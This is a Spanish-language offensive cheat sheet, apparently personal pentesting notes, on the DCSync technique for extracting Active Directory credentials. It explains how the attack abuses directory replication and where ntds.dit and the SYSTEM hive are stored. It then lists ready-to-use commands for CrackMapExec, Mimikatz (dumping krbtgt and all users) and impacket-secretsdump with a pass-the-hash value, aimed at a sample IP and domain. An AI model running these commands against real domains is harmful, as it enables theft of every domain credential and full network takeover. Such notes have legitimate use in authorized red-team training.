# DCSync

Tags: #AD #DCSync 

DCSync es una técnica de post-explotación en entornos Windows, específicamente en redes que operan con Active Directory (AD). Este método permite a un atacante con privilegios elevados imitar las funciones de un Controlador de Dominio (DC) para obtener información sensible de otros DCs. Entre los datos comprometidos se incluyen hashes de contraseñas de usuarios, claves de cifrado de Kerberos y otros elementos protegidos que normalmente solo están disponibles para los Controladores de Dominio.

```bash 
# Cómo funciona DCSync
1. Privilegios Necesarios: Para ejecutar un ataque DCSync, el atacante necesita tener privilegios de nivel alto en el dominio, típicamente como un usuario con el rol de "Domain Admin" o similar.
2. Mimikatz y DCSync: Una de las herramientas más populares que implementa este ataque es Mimikatz. Mimikatz tiene un módulo llamado 'lsadump' que puede utilizarse para realizar un ataque DCSync.
3. Replicación de Directorio: El ataque se basa en la funcionalidad legítima de replicación de directorio entre Controladores de Dominio. El protocolo de replicación de AD, MS-DRSR (Microsoft Directory Replication Service (DRS) Remote Protocol), permite a un DC obtener actualizaciones de datos de otro DC. Un atacante puede utilizar este protocolo para simular una solicitud de replicación.
4. Solicitud de Datos de Cuentas: Un atacante puede solicitar los datos de ciertas cuentas específicas, o incluso de todas las cuentas en el dominio, lo que incluye los hashes de las contraseñas de NTLM y los tickets de Kerberos (TGTs).
5. Extracción de Información Sensible: El ataque permite que el atacante extraiga información que puede ser utilizada para aumentar su nivel de acceso o para comprometer aún más la red, realizando ataques de movimiento lateral o elevación de privilegios.
```

```powershell 
## Extracción de Credenciales del Dominio de Active Directory

Cuando se realiza una tarea tan crítica como la extracción de credenciales de un dominio de Active Directory, es fundamental comprender la importancia y la sensibilidad de los archivos involucrados. El archivo NTDS.dit es esencialmente el corazón de AD, ya que contiene todas las cuentas de usuario, contraseñas hash y otros datos críticos del dominio. Por lo tanto, es un objetivo primordial en las actividades de post-explotación y debe ser manejado con extrema precaución y bajo estrictas medidas de seguridad.

El archivo de sistema, comúnmente conocido como el hive SYSTEM, contiene configuraciones clave del sistema y es necesario para descifrar los hashes de contraseñas almacenados en NTDS.dit.

Normalmente, puedes encontrar el archivo ntds.dit en dos ubicaciones:

❯ systemroot\NTDS\ntds.dit
❯ systemroot\System32\ntds.dit
    
Y la ruta del SYSTEM en:

❯ C:\Windows\System32\SYSTEM

Es común que estos archivos sean el objetivo principal de herramientas de extracción de credenciales, como el ataque DCSync que emula el comportamiento de un controlador de dominio solicitando información de usuario de otros controladores de dominio sin necesidad de ejecutar código en el controlador de dominio objetivo.
```

## Utilizando CrackMapExec

```powershell 
❯ ./cme smb 3.14.245.175 -u "admin" -p "Password@1" -d "domain1.corp" --ntds
```

## Utilizando Mimikatz

```powershell
❯ .\mimikatz.exe # lsadump::dcsync /domain:domain1.corp /user:krbtgt
```

## Para exfiltrar todos los usuarios del dominio:

```powershell
❯ mimikatz # lsadump::dcsync /domain:domain1.corp /all /csv
```

## Utilizando Impacket-secretsdump

```powershell
❯ impacket-secretsdump -debug -dc-ip 3.14.245.175 admin@domain1.corp -hashes :64fbae31cc352fc26af97cbdef151e03
```